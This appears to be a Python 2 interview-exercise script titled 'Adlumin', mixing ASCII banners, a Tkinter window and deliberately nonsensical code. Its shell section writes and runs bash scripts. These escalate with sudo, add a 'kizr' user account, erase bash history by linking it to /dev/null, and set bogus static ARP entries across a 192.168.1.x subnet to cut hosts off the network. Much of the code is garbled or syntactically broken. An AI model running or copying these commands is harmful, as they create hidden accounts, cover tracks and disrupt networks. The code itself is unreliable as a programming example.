# usr/bin/env python
# usr/get/bin/env/cmp Adlumin
#Requirements for Running:
#	C:/Jobs
#python Adlumin.py
#Final Notes:
'''
	There are 10 types of people in this world...
		__file__.run().read()
			&&
		__file__.read().run()
'''
#Final Timestamp for Work on Friday: 2017-07-14 23:03:13 -0400
#$ mv C:/Jobs/Adlumin.py C:/
#$ mv C:/Adlumin.py C:/Jobs
#Final Timestamp For Work On Saturday: 2017-07-15 16:51:35 -0400 (Code Review and Cleaning)
login='''
                                                                          
 ad88888ba  88                     88 88    88888888ba             88 88  
d8"     "8b 88                     88 88    88      "8b            88 88  
Y8,         88                     88 88    88      ,8P            88 88  
`Y8aaaaa,   88,dPPYba,   ,adPPYba, 88 88    88aaaaaa8P'  ,adPPYba, 88 88  
  `"""""8b, 88P'    "8a a8P_____88 88 88    88""""""8b, a8P_____88 88 88  
        `8b 88       88 8PP""""""" 88 88    88      `8b 8PP""""""" 88 88  
Y8a     a8P 88       88 "8b,   ,aa 88 88    88      a8P "8b,   ,aa 88 88  
 "Y88888P"  88       88  `"Ybbd8"' 88 88    88888888P"   `"Ybbd8"' 88 88'''
menu="""
title				:menu.py
description			:Adlumin Technical Interview
author 				:Alexander Steel
date				:2017-07-15 14:31:34 -0400
version 			:v0.1
usage				:python Adlumin.py
begin				:Start Submission Time: 2017-07-14 20:31:42 -0400
notes				:Final Submission Time: 2017-07-15 17:20:19 -0400
python_version :2.7.6
"""
print(login)
print(menu)
#########################################
x = '\r86\x50\o0x'.decode()
y = x.isalpha()
z = property(intern('Adlumin'))
#Fixed Property Value Return
print(str(cmp(x,z)), str(cmp(x,y)), str(cmp(z,y)))
#########################################
'''
  ___ _   _ ___ 
 / __| | | |_ _|
| (_ | |_| || | 
 \___|\___/|___|
                '''
#########################################
import Tkinter
from Tkinter import *
import tkMessageBox
import os,binascii
t = Tkinter.Tk()
def struct():
   tkMessageBox.showinfo("Initialization", "Hey There Sean, Don and Griffin!")
#end
jumanji = Tkinter.Button(t, text = "xArgs", command = struct)
jumanji.pack()
seq = Label(t, text="Login: ")
seq.pack(side = TOP)
en = Entry(t,bd =5)
en.pack(side = TOP)
Q = Tkinter.Button(t, text ="question", relief=RAISED, bitmap="question")
Q.pack()
sC = Scrollbar(t)
sC.pack(side = RIGHT, fill=Y)
mL = Listbox(t, yscrollcommand = sC.set )
for line in range(100):
   mL.insert(END, binascii.b2a_hex(os.urandom(10)) + str(line))
#end
mL.pack(side = RIGHT, fill = BOTH)
sC.config(command = mL.yview)
t.mainloop()
print(en)
#########################################
'''
 ___  _         _  _ 
/ __>| |_  ___ | || |
\__ \| . |/ ._>| || |
<___/|_|_|\___.|_||_|
'''
#########################################
from subprocess import call, Popen, PIPE, STDOUT
import os
call(["mkdir", "-p", "Kizr/rziK"])
#FIRST FILE CREATION
a = r"C:\Jobs\Kizr\rziK"
b = './test.sh'
c = os.path.join(a,b)
with open(c,"w") as d:
   d.write('echo "Hello World"\n'),  
   #########################################
   #         '''Main Script'''
   # Not Working On My Git Bash
   # Functional On Linux, Mac OS
   # Adds a user onto the system With Cred:
   # kizr/rzik
   #########################################
   d.write('sudo bash\n'), d.write('chmod 0077\n')
   d.write('chmod 0700\n'), d.write('touch tex\n'), d.write('ln -ls tex | wc\n')
   d.write('useradd -m kizr\n'), d.write('passwd rzik\n'), d.write('chfn\n'),
   d.write('ln /dev/null ~./bash_history -sf')
   #########################################
   #         '''Secondary Script'''
   #Again, Non Functional On Git Bash
   #Functional On Linux, Mac OS
   #IP Banning Script
   #########################################
   d.write('i = 2\n'), d.write('while [$i -le 253]\n'),
   d.write('do\n'),
   d.write('    if[$i -ne 20 -a $i -ne 21 -a $i -ne 22]\n'),
   d.write('        echo "WUBBA: arp -s 192.168.1.$i"\n'),
   d.write('        arp -s 192.168.1.$i 00:00:00:00:00:0a\n'),
   d.write('    else\n'),
   d.write('        echo "LUBBA: 192.168.1.$i"\n'),
   d.write('    fi\n'), d.write("i='expr $i +1'\n")
#End File One, Begin File Two
e = './Shell.sh'
f = os.path.join(a,e)
with open(f,"w") as g:
   g.write('echo "Hello Alex"\n'), g.write('wmic process get description,executablepath\n')   
   #########################################
   #         '''Tertiary Script'''
   #Again, Non Functional On Git Bash
   #Functional On Linux, Mac OS
   #Groot
   #########################################
   g.write('#/bin/bash\n'), g.write("if['whoami'='root']\n"),
   g.write('    echo "I am Groot"\n')
   g.write('else\n')
   g.write('    echo "I am not Groot"\n')
   g.write('fi\n')
call(["ls", "-l"])
#########################################
'''
       '\\  //`        
         \\//          
.|''|,    ><    .|''|, 
||..||   //\\   ||..|| 
`|...  .//  \\. `|...  
                       
'''
#########################################
from os import system
os.system("cd Kizr/rziK & bash test.sh")
#########################################
'''
__________                          .___            
\______   \_____ ____________     __| _/_______  ___
 |     ___/\__  \\_  __ \__  \   / __ |/  _ \  \/  /
 |    |     / __ \|  | \// __ \_/ /_/ (  <_> >    < 
 |____|    (____  /__|  (____  /\____ |\____/__/\_ \
                \/           \/      \/           \/
'''
#########################################
o = ['5xY \r'.count('o'), '%z^123', '*arg', '<b></b>']
class Paradox:
	def __init__(self, gb):
		print "\x12\x12\x65\v23\v12\m87\00".encode('utf-8', 'accept')
		#print "\x12\x12\x65\v23\v12\m87\00".join(SystemExit())
	#end
	def __key__(self):
		l = "\x12\x12\x65\v23\v12\m87\00".center(85,'x')#.__sizeof__()
		#print(l)
		if(l == 'e2312\m87'):
			StopIteration().__class__()
		#end
	#end
#end
g = 10100111111110000
abc = Paradox(g)
abc.__init__(os.system("cd Kizr/rziK & bash Shell.sh"))
#########################################
'''
_______________________
    ____         _____ 
    /    )   ,   /    )
---/____/-------/----/-
  /        /   /    /  
_/________/___/____/___                     
'''
#########################################
StandardError(e > SyntaxWarning('false')); print(property(locals()))
#Warmup Checking In 2017-07-15 12:56:52 -0400
u = '\g00\h99\a11\z31\h00\x00\m54'
po = list(enumerate(o))
from dbhash import sys
import Bastion
#dy = sys.api_version(u)
#dy = sys.byteorder(u)
class Bebop:
	if __name__ == '__main__':
		for i in 'Adlumiun':
			#reduce(0,'\r', 1)
			for i in range(0,1):
				print(unichr(g.bit_length()) or set(repr(po,'\w')).difference_update())
				def Greed(self):
					#self.__loader__(unicode('character', 'utf-32', 'accept'))
					#Bastion.MethodType(dy, u, Bebop)
					#print(dy)
					gg = hex(g)
					print('<attr>', gg ,'</attr>')
				#end
			#end
		#end
	#end
#end
spike = Bebop()
spike.Greed()
#v0.3 2017-07-15 16:19:29 -0400
"""FINAL OUTPUT & Break Before Finalizing and Checking 2017-07-15 16:37:07 -0400"""